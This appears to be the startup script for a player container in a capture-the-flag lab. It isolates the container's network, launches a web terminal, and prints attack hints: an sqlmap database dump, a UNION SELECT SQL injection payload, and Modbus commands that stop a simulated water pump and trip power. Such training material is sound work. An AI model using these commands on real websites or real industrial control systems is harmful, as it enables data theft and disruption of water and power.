#!/bin/sh
# Box it in: drop the default route so this container cannot reach the host LAN
# or the internet. Same-network traffic to the town's containers still works, so
# you can still scan and attack the targets.
ip route del default 2>/dev/null && echo "[player] default route removed" \
  || echo "[player] no default route to remove"

# in-browser terminal (the map opens this for the mainframe targets)
ttyd -p 7681 -W -t fontSize=15 -t 'theme={"background":"#101418"}' \
     /usr/local/bin/pktr-connect >/dev/null 2>&1 &
echo "[player] ttyd terminal on :7681"

cat <<'EOF'
[player] ready. scripts are in /opt/pktr/scripts:

  python3 recon.py                       # nmap the lab

  # General Store (web):
  curl -s -c /tmp/j -d 'username=shopper&password=shopper' http://websites/ >/dev/null
  sqlmap -u "http://websites/search.php?q=x" --load-cookies=/tmp/j --batch \
         --dump -T staff_notes -D generalstore
  #   or by hand:  q=x%' UNION SELECT 1,note,1 FROM staff_notes-- -

  # Water / power (Modbus, no auth):
  python3 modbus_attack.py water stop-pump      # town loses water
  python3 modbus_attack.py water flag           # set maint mode, decode the flag
  python3 modbus_attack.py power trip industrial
  python3 modbus_attack.py power flag

  # submit a flag (use your scoreboard session cookie):
  curl -s -X POST http://scoring:8001/api/score/submit -H 'Content-Type: application/json' \
       -b /tmp/sc -d '{"flag":"PKTR{...}"}'
EOF

exec sleep infinity
